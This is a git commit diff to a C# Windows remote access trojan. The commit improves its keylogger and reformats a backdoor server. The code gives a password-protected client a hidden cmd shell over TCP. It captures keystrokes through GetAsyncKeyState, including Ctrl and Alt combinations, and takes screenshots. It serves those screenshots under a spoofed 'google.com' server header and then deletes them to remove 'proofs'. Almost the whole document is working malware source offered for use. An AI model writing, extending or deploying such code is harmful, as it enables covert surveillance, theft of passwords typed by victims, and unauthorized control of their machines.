b2630da62b528718b55ad9ae1a32dc3e581c8d49
Toumash <mr.toumash@gmail.com>
2015-07-27 18:43:31 +0200

    improved keylogger, not so many trash at output

--- KeyLogger.cs
+++ KeyLogger.cs
@@ -5,35 +5,92 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows.Forms;
 
-namespace RAT {
-	class KeyLogger {
-		[DllImport("user32.dll")]
-		public static extern int GetAsyncKeyState(Int32 i);
+namespace RAT
+{
+    class KeyLogger
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
 
-		StringBuilder sb = new StringBuilder();
-		bool running = true;
+        #region toggles
+        static bool UsingModifier(Keys key) { return Convert.ToBoolean(GetAsyncKeyState((int)key) & 0x8000); }
+        static bool ControlKey { get { return UsingModifier(Keys.ControlKey); } }
+        static bool ShiftKey { get { return UsingModifier(Keys.ShiftKey); } }
+        static bool CapsLock { get { return UsingModifier(Keys.CapsLock); } }
+        static bool AltKey { get { return UsingModifier(Keys.Menu); } }
+        #endregion
 
-		public void Start() {
-			running = true;
 
-			while (running) {
-				Thread.Sleep(17);
-				for (Int32 i = 0; i < 255; i++) {
-					int state = GetAsyncKeyState(i);
-					if (state == 1 || state == -32767) {
-						Console.WriteLine((Keys) i);
-						sb.Append((Keys) i);
-						break;
-					}
-				}
-			}
-		}
+        StringBuilder Log = new StringBuilder();
+        bool running = true;
 
-		public string Dump() {
-			running = false;
-			string capturedKeys = sb.ToString();
-			sb.Clear();
-			return capturedKeys;
-		}
-	}
+        List<Keys> notLoggedKeys = new List<Keys>() {
+                Keys.ShiftKey,   Keys.RShiftKey,    Keys.LShiftKey,
+                Keys.ControlKey, Keys.RControlKey,  Keys.LControlKey,
+                Keys.Menu,       Keys.RMenu,        Keys.LMenu,
+                Keys.CapsLock
+            };
+
+        public void Start()
+        {
+            running = true;
+
+            Dictionary<Keys, string> dict = new Dictionary<Keys, string>()
+            {
+                { Keys.Back, "{<<}" }, {Keys.Return,"{ENTER}" }, {Keys.Escape,"{ESC}" }
+                //TODO: add more keys because all special characters have strange symbol
+            };
+
+            while (running)
+            {
+                Thread.Sleep(100);
+                for (int i = 0; i < 255; i++)
+                {
+                    if (notLoggedKeys.Contains((Keys)i)) { continue; }
+
+                    int state = GetAsyncKeyState(i);
+                    bool keyPressed = state == 1 || state == -32767;
+                    if (!keyPressed) { continue; }
+
+                    string key = ((Keys)i).ToString();
+
+                    if (dict.ContainsKey((Keys)i))
+                    {
+                        key = dict[(Keys)i];
+                    }
+                    else
+                    {
+                        if (!(CapsLock || ShiftKey))
+                        {
+                            key = key.ToLower();
+                        }
+
+                        if (ControlKey && AltKey)
+                        {
+                            key = "{CtrlAlt:" + key + ":}";
+                        }
+                        else if (ControlKey)
+                        {
+                            key = "{Ctrl:" + key + ":}";
+                        }
+                        else if (AltKey)
+                        {
+                            key = "{Alt:" + key + ":}";
+                        }
+                    }
+                    Console.Write(key);
+                    Log.Append(key);
+                    break;
+                }
+            }
+        }
+
+        public string StopAndDump()
+        {
+            running = false;
+            string capturedKeys = Log.ToString();
+            Log.Clear();
+            return capturedKeys;
+        }
+    }
 }
--- Program.cs
+++ Program.cs
@@ -9,245 +9,267 @@ using System.Drawing;
 using System.Windows.Forms;
 using RAT;
 
-namespace BackdoorServer {
-	public class Backdoor {
-		TcpListener listener;
-		Socket socket;
-		Process shell;
-		StreamReader fromShell;
-		StreamWriter toShell;
-		StreamReader inStream;
-		StreamWriter outStream;
-		Thread shellReaderThread;
-		Thread keyloggerThread;
-		KeyLogger keylogger;
+namespace BackdoorServer
+{
+    public class Backdoor
+    {
+        TcpListener listener;
+        Socket socket;
+        Process shell;
+        StreamReader fromShell;
+        StreamWriter toShell;
+        StreamReader inStream;
+        StreamWriter outStream;
+        Thread shellReaderThread;
+        Thread keyloggerThread;
+        KeyLogger keylogger;
 
-		int port {
-			get;
-			set;
-		}
-		string serverName {
-			get;
-			set;
-		}
-		string password {
-			get;
-		}
-		bool verbose {
-			get;
-			set;
-		}
+        int port { get; set; }
+        string serverName { get; set; }
+        string password { get; set; }
+        bool verbose { get; set; }
 
-		public Backdoor(int port = 1337, string serverName = "RAT", string password = "P455wD", bool verbose = true) {
-			this.port = port;
-			this.serverName = serverName;
-			this.password = password;
-			this.verbose = verbose;
-		}
+        public Backdoor(int port = 1337, string serverName = "RAT", string password = "P455wD", bool verbose = true)
+        {
+            this.port = port;
+            this.serverName = serverName;
+            this.password = password;
+            this.verbose = verbose;
+        }
 
-		public void startServer() {
-			try {
-				if (verbose) Console.WriteLine("Listening on port " + port);
+        public void StartServer()
+        {
+            try
+            {
+                if (verbose) Console.WriteLine("Listening on port " + port);
 
-				listener = new TcpListener(IPAddress.Any, port);
-				listener.Start(); // blocking call
-				socket = listener.AcceptSocket();
+                listener = new TcpListener(IPAddress.Any, port);
+                listener.Start(); // blocking call
+                socket = listener.AcceptSocket();
 
-				if (verbose) Console.WriteLine("Client connected: " + socket.RemoteEndPoint);
+                if (verbose) Console.WriteLine("Client connected: " + socket.RemoteEndPoint);
 
-				Stream s = new NetworkStream(socket);
-				inStream = new StreamReader(s, Encoding.ASCII);
-				outStream = new StreamWriter(s, Encoding.ASCII);
-				outStream.AutoFlush = true;
+                Stream s = new NetworkStream(socket);
+                inStream = new StreamReader(s, Encoding.ASCII);
+                outStream = new StreamWriter(s, Encoding.ASCII);
+                outStream.AutoFlush = true;
 
-				outStream.WriteLine("Pswd:");
-				string checkPass = inStream.ReadLine();
+                outStream.WriteLine("Pswd:");
+                string checkPass = inStream.ReadLine();
 
-				if (verbose) Console.WriteLine("Client tried password " + checkPass);
-				if (!checkPass.Equals(password)) {
-					if (verbose) Console.WriteLine("Incorrect Password");
-					DropConnection();
-					return;
-				}
-				if (verbose) Console.WriteLine("Password Accepted.");
+                if (verbose) Console.WriteLine("Client tried password " + checkPass);
+                if (!checkPass.Equals(password))
+                {
+                    if (verbose) Console.WriteLine("Incorrect Password");
+                    DropConnection();
+                    return;
+                }
+                if (verbose) Console.WriteLine("Password Accepted.");
 
-				StartShell();
-			} catch (Exception e) {
-				Console.WriteLine("<ERROR> Bad things happen:");
-				Console.WriteLine(e.ToString());
-			} finally {
-				CloseShell();
-			}
-		}
-		void StartShell() {
-			shell = new Process();
-			ProcessStartInfo p = new ProcessStartInfo("cmd") {
-				CreateNoWindow = true,
-				UseShellExecute = false,
-				RedirectStandardError = true,
-				RedirectStandardInput = true,
-				RedirectStandardOutput = true
-			};
-			shell.StartInfo = p;
-			shell.Start();
+                StartShell();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("<ERROR> Bad things happen:");
+                Console.WriteLine(e.ToString());
+            }
+            finally
+            {
+                CloseShell();
+            }
+        }
 
-			toShell = shell.StandardInput;
-			fromShell = shell.StandardOutput;
-			toShell.AutoFlush = true;
+        void StartShell()
+        {
+            shell = new Process();
+            ProcessStartInfo p = new ProcessStartInfo("cmd")
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardError = true,
+                RedirectStandardInput = true,
+                RedirectStandardOutput = true
+            };
+            shell.StartInfo = p;
+            shell.Start();
 
-			// start sending output to the user
-			shellReaderThread = new Thread(new ThreadStart(SendShellOutput));
-			shellReaderThread.Start();
+            toShell = shell.StandardInput;
+            fromShell = shell.StandardOutput;
+            toShell.AutoFlush = true;
 
-			// welcome message
-			outStream.WriteLine("  Welcome to " + serverName + " RAT  ".AlignCenter(80, '='));
-			outStream.WriteLine("  SINGLE-USER MODE  ".AlignCenter(80, '='));
+            // start sending output to the user
+            shellReaderThread = new Thread(new ThreadStart(SendShellOutput));
+            shellReaderThread.Start();
 
-			InputLoop();
-		}
+            // welcome message
+            outStream.WriteLine(String.Format("  Welcome to {0} RAT  ", serverName).AlignCenter(80, '='));
+            outStream.WriteLine("  SINGLE-USER MODE  ".AlignCenter(80, '='));
 
-		void SendShellOutput() {
-			string buffer = "";
-			while ((buffer = fromShell.ReadLine()) != null) {
-				outStream.WriteLine(buffer + "\r");
+            InputLoop();
+        }
 
-				// temporary, for logging
-				Console.ForegroundColor = ConsoleColor.Cyan;
-				Console.WriteLine(buffer);
-				Console.ResetColor();
-			}
-			CloseShell();
-		}
+        void SendShellOutput()
+        {
+            string buffer = "";
+            while ((buffer = fromShell.ReadLine()) != null)
+            {
+                outStream.WriteLine(buffer + "\r");
 
-		void InputLoop() {
-			string tempBuff = "";
-			while (((tempBuff = inStream.ReadLine()) != null)) {
-				if (verbose) Console.WriteLine(">> " + tempBuff);
-				HandleCommand(tempBuff);
-			}
-		}
+                // temporary, for logging
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.WriteLine(buffer);
+                Console.ResetColor();
+            }
+            CloseShell();
+        }
 
-		void HandleCommand(string command) {
-			switch (command) {
-				case RatAction.SCREENSHOT:
-					if (verbose) outStream.WriteLine("Taking a screenshot...");
-					string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
-					WindowsHelper.MakeScreenshot(path);
+        void InputLoop()
+        {
+            string tempBuff = "";
+            while (((tempBuff = inStream.ReadLine()) != null))
+            {
+                if (verbose) Console.WriteLine(">> " + tempBuff);
+                HandleCommand(tempBuff);
+            }
+        }
 
-					Console.WriteLine("Image is hosted at port 2790");
-					outStream.WriteLine("Image is hosted at port 2790");
-					HostImage(path);
-					Console.WriteLine("Image Sent < OK > !");
-					// delete all proofs
-					File.Delete(path);
-					Console.WriteLine("Image deleted");
-					if (verbose) outStream.WriteLine("Screenshot downloaded and deleted successfully!");
-					break;
-				case RatAction.KEYLOGGER_START:
-					if (keylogger != null) {
-						keylogger.Dump();
-					}
-					keylogger = new KeyLogger();
-					keyloggerThread = new Thread(new ThreadStart(keylogger.Start));
-					keyloggerThread.Start();
-					break;
-				case RatAction.KEYLOGGER_DUMP:
-					string dump = keylogger.Dump();
-					keyloggerThread.Abort();
-					keyloggerThread = null;
-					outStream.WriteLine("Captured input:");
-					outStream.WriteLine(dump);
-					break;
+        void HandleCommand(string command)
+        {
+            switch (command)
+            {
+                case RatAction.SCREENSHOT:
+                    if (verbose) outStream.WriteLine("Taking a screenshot...");
+                    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
+                    WindowsHelper.MakeScreenshot(path);
+
+                    Console.WriteLine("Image is hosted at port 2790");
+                    outStream.WriteLine("Image is hosted at port 2790");
+                    HostImage(path);
+                    Console.WriteLine("Image Sent < OK > !");
+                    // delete all proofs
+                    File.Delete(path);
+                    Console.WriteLine("Image deleted");
+                    if (verbose) outStream.WriteLine("Screenshot downloaded and deleted successfully!");
+                    break;
+                case RatAction.KEYLOGGER_START:
+                    if (keylogger != null)
+                    {
+                        keylogger.StopAndDump();
+                    }
+                    keylogger = new KeyLogger();
+                    keyloggerThread = new Thread(new ThreadStart(keylogger.Start));
+                    keyloggerThread.Start();
+                    break;
+                case RatAction.KEYLOGGER_DUMP:
+                    string dump = keylogger.StopAndDump();
+                    keyloggerThread.Abort();
+                    keyloggerThread = null;
+                    outStream.WriteLine("Captured input:");
+                    outStream.WriteLine(dump);
+                    break;
                 case RatAction.SHOW_MESSAGE:
-                    if(verbose) Console.WriteLine("Show message mode");
+                    if (verbose) Console.WriteLine("Show message mode");
                     outStream.WriteLine("Title:");
                     string title = inStream.ReadLine();
                     outStream.WriteLine("Content");
                     string content = inStream.ReadLine();
-                    
-                    outStream.WriteLine(String.Format("Do you really want to show message:\r\n=========\r\n{0}\r\n========\r\n{1}\r\n\r\n[Y/N]",title,content));
+
+                    outStream.WriteLine(String.Format("Do you really want to show message:\r\n=========\r\n{0}\r\n========\r\n{1}\r\n\r\n[Y/N]", title, content));
                     string response = inStream.ReadLine();
                     if (response.Equals("y"))
                     {
                         outStream.WriteLine("Message shown");
-                        new Thread(delegate() { MessageBox.Show(content, title, MessageBoxButtons.OK);}).Start();
+                        new Thread(delegate () { MessageBox.Show(content, title, MessageBoxButtons.OK); }).Start();
                         Console.WriteLine("Message shown");
-                    } else{
+                    }
+                    else
+                    {
                         Console.WriteLine("Message denied");
                         outStream.WriteLine("MessageBox showing denied by the user");
                     }
                     break;
-				case RatAction.QUIT:
-					outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
-					CloseShell();
-					break;
-				default:
-					toShell.WriteLine(command + "\r\n");
-					break;
-			}
-		}
+                case RatAction.QUIT:
+                    outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
+                    CloseShell();
+                    break;
+                default:
+                    toShell.WriteLine(command + "\r\n");
+                    break;
+            }
+        }
 
-		void HostImage(string path) {
-			string responseHeaders =
-				"HTTP/1.1 200 OK\r\n" +
-				"Server: google.com\r\n" +
-				"Content-Length: " + new FileInfo(path).Length + "\r\n" +
-				"Content-Type: image/png\r\n" +
-				"Content-Disposition: inline;filename=\"image.png;\"\r\n" +
-				"\r\n";
+        void HostImage(string path)
+        {
+            string responseHeaders =
+                "HTTP/1.1 200 OK\r\n" +
+                "Server: google.com\r\n" +
+                "Content-Length: " + new FileInfo(path).Length + "\r\n" +
+                "Content-Type: image/png\r\n" +
+                "Content-Disposition: inline;filename=\"image.png;\"\r\n" +
+                "\r\n";
 
-			//headers should ALWAYS be ascii. Never UTF8
-			var headerBytes = Encoding.ASCII.GetBytes(responseHeaders);
+            //headers should ALWAYS be ascii. Never UTF8
+            var headerBytes = Encoding.ASCII.GetBytes(responseHeaders);
 
-			var lstr = new TcpListener(IPAddress.Any, RatAction.SCREENSHOT_PORT);
-			lstr.Start();
-			Console.WriteLine("Waiting for client to connect...");
-			var webSocket = lstr.AcceptSocket();
+            var lstr = new TcpListener(IPAddress.Any, RatAction.SCREENSHOT_PORT);
+            lstr.Start();
+            Console.WriteLine("Waiting for client to connect...");
+            var webSocket = lstr.AcceptSocket();
 
-			webSocket.Send(headerBytes);
-			webSocket.SendFile(path);
-			webSocket.Close();
-			lstr.Stop();
-		}
+            webSocket.Send(headerBytes);
+            webSocket.SendFile(path);
+            webSocket.Close();
+            lstr.Stop();
+        }
 
-		void DropConnection() {
-			if (verbose) Console.WriteLine("Dropping Connection");
-			inStream.Dispose();
-			outStream.Dispose();
-			socket.Close();
-			listener.Stop();
-		}
+        void DropConnection()
+        {
+            if (verbose) Console.WriteLine("Dropping Connection");
+            inStream.Dispose();
+            outStream.Dispose();
+            socket.Close();
+            listener.Stop();
+        }
 
-		void CloseShell() {
-			try {
-				if (verbose) Console.WriteLine("Closing shell process");
-				if (shell != null) {
-					shell.Close();
-					shell.Dispose();
-				}
-				if (shellReaderThread != null) {
-					shellReaderThread.Abort();
-					shellReaderThread = null;
-				}
-				toShell.Dispose();
-				fromShell.Dispose();
-				shell.Dispose();
+        void CloseShell()
+        {
+            try
+            {
+                if (verbose) Console.WriteLine("Closing shell process");
+                if (shell != null)
+                {
+                    shell.Close();
+                    shell.Dispose();
+                }
+                if (shellReaderThread != null)
+                {
+                    shellReaderThread.Abort();
+                    shellReaderThread = null;
+                }
+                toShell.Dispose();
+                fromShell.Dispose();
+                shell.Dispose();
 
-				DropConnection();
-			} catch (Exception) {}
-		}
+                DropConnection();
+            }
+            catch (Exception) { }
+        }
 
-		static void Main(string[] args) {
-			try {
-				Backdoor bd = new Backdoor();
-				if (args.Length == 1) bd = new Backdoor(int.Parse(args[0]));
-				if (args.Length == 2) bd = new Backdoor(int.Parse(args[0]), args[1]);
-				if (args.Length == 3) bd = new Backdoor(int.Parse(args[0]), args[1], args[2]);
-				else if (args.Length == 4) bd = new Backdoor(int.Parse(args[0]), args[1], args[2], bool.Parse(args[3]));
-				while (true) {
-					bd.startServer();
-				}
-			} catch (Exception) {}
-		}
-	}
+        static void Main(string[] args)
+        {
+            try
+            {
+                Backdoor bd = new Backdoor();
+                if (args.Length == 1) bd = new Backdoor(int.Parse(args[0]));
+                if (args.Length == 2) bd = new Backdoor(int.Parse(args[0]), args[1]);
+                if (args.Length == 3) bd = new Backdoor(int.Parse(args[0]), args[1], args[2]);
+                else if (args.Length == 4) bd = new Backdoor(int.Parse(args[0]), args[1], args[2], bool.Parse(args[3]));
+                while (true)
+                {
+                    bd.StartServer();
+                }
+            }
+            catch (Exception) { }
+        }
+    }
 }
